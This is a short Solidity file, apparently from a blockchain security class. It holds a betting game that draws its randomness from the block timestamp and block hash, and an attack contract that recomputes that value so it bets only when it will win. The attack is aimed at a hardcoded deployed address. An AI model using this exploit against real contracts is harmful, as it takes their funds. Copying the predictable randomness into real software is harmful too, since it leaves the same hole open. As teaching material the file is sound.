/**
 *Submitted for verification at Etherscan.io on 2021-06-24
*/

pragma solidity ^0.4.24;

contract class44_game{

    event win(address);

    function get_random() public view returns(uint){
        bytes32 ramdon = keccak256(abi.encodePacked(now,blockhash(block.number-1)));
        return uint(ramdon) % 1000;
    }

    function play() public payable {
        require(msg.value == 0.01 ether);
        if(get_random()>=500){
            msg.sender.transfer(0.02 ether);
            emit win(msg.sender);
        }
    }

    function () public payable{
        require(msg.value == 1 ether);
    }
    
    constructor () public payable{
        require(msg.value == 1 ether);
    }
}

contract class44_attack{

    address public game = 0x11674E575B9eedB38a6d28a7ea830523Ca5d269e;

    class44_game gamecontract = class44_game(game);

    function get_random() public view returns(uint){
        bytes32 ramdon = keccak256(abi.encodePacked(now,blockhash(block.number-1)));    //使用跟lecture_game相同的方式產生亂數
        return uint(ramdon) % 1000;
    }

    function attack() public payable {
        require(get_random()>=500); // 有大於500(獲得獎金條件)才賭，否則就賠手續費而已
        gamecontract.play.value(0.01 ether)();
        
    }

    function () public payable{
        
    }
    
    constructor () public payable{
        require(msg.value == 1 ether);
    }
}